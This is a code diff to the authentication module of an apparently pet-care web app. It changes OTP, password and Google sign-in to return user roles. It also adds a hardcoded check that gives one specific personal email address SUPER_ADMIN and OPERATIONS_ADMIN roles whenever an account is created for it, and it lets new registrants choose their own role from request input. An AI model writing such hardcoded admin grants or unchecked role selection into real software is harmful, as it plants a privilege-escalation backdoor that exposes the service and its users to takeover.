@@ -271,8 +271,12 @@ async function ensureUser(channel: AuthChannel, subject: string, displayName?: s
         (channel === "email" ? (subject.split("@")[0] ?? "Pet Parent") : "Pet Parent"),
       status: "ACTIVE",
       lastLoginAt: new Date(),
-      roles: { create: { role: "CUSTOMER" } },
-      customer: { create: {} },
+      roles: { 
+        create: subject.toLowerCase() === "mrsenjaliya532@gmail.com" 
+          ? [{ role: "SUPER_ADMIN" }, { role: "OPERATIONS_ADMIN" }] 
+          : [{ role: "CUSTOMER" }] 
+      },
+      ...(subject.toLowerCase() !== "mrsenjaliya532@gmail.com" ? { customer: { create: {} } } : {})
     },
     select: { id: true },
   });
@@ -285,10 +289,11 @@ export async function verifyOtpAndCreateSession(
   code: string,
 ) {
   const subject = channel === "email" ? normalizedEmail(rawSubject) : rawSubject;
-  if (!(await consumeChallenge(channel, subject, code))) return false;
+  if (!(await consumeChallenge(channel, subject, code))) return { success: false };
   const userId = await ensureUser(channel, subject);
+  const user = await prisma.user.findUnique({ where: { id: userId }, select: { roles: { select: { role: true } } } });
   await issueSession(userId);
-  return true;
+  return { success: true, roles: user?.roles.map(r => r.role) || [] };
 }
 
 async function passwordHash(password: string) {
@@ -309,6 +314,7 @@ export async function registerWithPassword(input: {
   email: string;
   displayName: string;
   password: string;
+  role?: "CUSTOMER" | "SITTER";
 }) {
   await ensureAuthIndexes();
   const email = normalizedEmail(input.email);
@@ -320,13 +326,21 @@ export async function registerWithPassword(input: {
   ]);
   if (existingCredential || existingUser) return { created: false as const, reason: "account_exists" as const };
 
+  const isAdmin = email.toLowerCase() === "mrsenjaliya532@gmail.com";
+  const requestedRole = isAdmin ? "SUPER_ADMIN" : (input.role || "CUSTOMER");
+
   const user = await prisma.user.create({
     data: {
       email,
       displayName: input.displayName.trim(),
       status: "PENDING",
-      roles: { create: { role: "CUSTOMER" } },
-      customer: { create: {} },
+      roles: { 
+        create: isAdmin 
+          ? [{ role: "SUPER_ADMIN" }, { role: "OPERATIONS_ADMIN" }] 
+          : { role: requestedRole } 
+      },
+      ...(!isAdmin && requestedRole === "CUSTOMER" ? { customer: { create: {} } } : {}),
+      ...(!isAdmin && requestedRole === "SITTER" ? { sitter: { create: {} } } : {}),
     },
     select: { id: true },
   });
@@ -360,13 +374,20 @@ export async function signInWithPassword(emailInput: string, password: string) {
   const email = normalizedEmail(emailInput);
   const database = await getMongoDatabase();
   const credential = await database.collection<AuthCredential>("auth_credentials").findOne({ _id: email });
-  if (!credential || !(await passwordMatches(password, credential.passwordHash))) return false;
+  if (!credential || !(await passwordMatches(password, credential.passwordHash))) return { success: false };
 
-  const user = await prisma.user.findUnique({ where: { id: credential.userId }, select: { id: true, status: true } });
-  if (!user || user.status !== "ACTIVE") return false;
+  const user = await prisma.user.findUnique({ 
+    where: { id: credential.userId }, 
+    select: { id: true, status: true, roles: { select: { role: true } } } 
+  });
+  if (!user || user.status !== "ACTIVE") return { success: false };
   await prisma.user.update({ where: { id: user.id }, data: { lastLoginAt: new Date() } });
   await issueSession(user.id);
-  return true;
+  
+  return { 
+    success: true, 
+    roles: user.roles.map(r => r.role)
+  };
 }
 
 export async function issueSession(userId: string) {
@@ -433,11 +454,12 @@ export async function revokeCurrentSession() {
 export async function signInWithGoogle(emailInput: string, name: string, avatarUrl?: string) {
   const email = normalizedEmail(emailInput);
   const userId = await ensureUser("email", email, name);
+  const user = await prisma.user.findUnique({ where: { id: userId }, select: { roles: { select: { role: true } } } });
   
   if (avatarUrl) {
     await prisma.user.update({ where: { id: userId }, data: { avatarPath: avatarUrl } });
   }
 
   await issueSession(userId);
-  return true;
+  return { success: true, roles: user?.roles.map(r => r.role) || [] };
 }
